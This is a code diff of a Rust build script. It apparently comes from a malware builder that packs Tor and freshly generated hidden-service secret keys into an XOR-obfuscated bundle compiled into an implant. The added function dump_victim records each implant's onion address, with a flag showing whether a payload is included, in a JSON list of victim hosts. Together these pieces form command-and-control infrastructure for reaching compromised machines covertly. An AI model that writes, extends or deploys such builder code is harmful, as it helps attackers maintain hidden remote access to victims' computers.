@@ -9,6 +9,7 @@ const CFG_DESTINATION: &str = "src/config.rs";
 const CFG_SETTINGS: &str = "settings.json";
 
 struct BuildSetting {
+    hosts_file: PathBuf,
     is_tor_for_windows: bool,
     key: String,
     windows_url: String,
@@ -113,6 +114,8 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
     let dir = tmp_dir.path().to_str().unwrap();
     let hs_addr = generate_hs_secrets(dir)?;
 
+    dump_victim(hs_addr, &setting)?;
+
     let mut archive = tar::Builder::new(Vec::new());
     archive.append_dir_all(&setting.name, &dir)?;
 
@@ -120,6 +123,22 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
 
     let bundle = xor::encode_bytes(&setting.key, &data);
     Ok(bundle)
+}
+
+fn dump_victim(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error::Error>> {
+    let mut hosts = match fs::read_to_string(&setting.hosts_file) {
+        Ok(data) => json::parse(&data)?,
+        Err(_) => json::JsonValue::new_array()
+    };
+
+    let mut host = json::JsonValue::new_object();
+    host["address"] = address.into();
+    host["uses_payload"] = (&setting.payload_data != "").into();
+
+    hosts.push(host)?;
+    fs::write(&setting.hosts_file, hosts.pretty(4))?;
+
+    Ok(())
 }
 
 fn generate_hs_secrets(
@@ -147,8 +166,6 @@ fn generate_hs_secrets(
     fs::copy(secrets_dir.join("hostname"), dir.join("hostname"))?;
     fs::copy(secrets_dir.join("hs_ed25519_public_key"), dir.join("hs_ed25519_public_key"))?;
     fs::copy(secrets_dir.join("hs_ed25519_secret_key"), dir.join("hs_ed25519_secret_key"))?;
-
-    fs::copy(secrets_dir.join("hostname"), Path::new("../hostname"))?;
 
     Ok(String::from(hs_addr))
 }
@@ -218,6 +235,12 @@ fn replace_settings(
 }
 
 fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
+    let hosts_file = PathBuf::from(
+        raw["hosts_file"].as_str().unwrap_or_else(|| {
+            panic!("invalid hosts_file setting");
+        })
+    );
+
     let key = if raw.has_key("key") {
         String::from(
             raw["key"].as_str().unwrap_or_else(|| {
@@ -293,6 +316,7 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
     );
 
     BuildSetting {
+        hosts_file,
         is_tor_for_windows: cfg!(feature = "tor_for_windows"),
         key,
         windows_url,
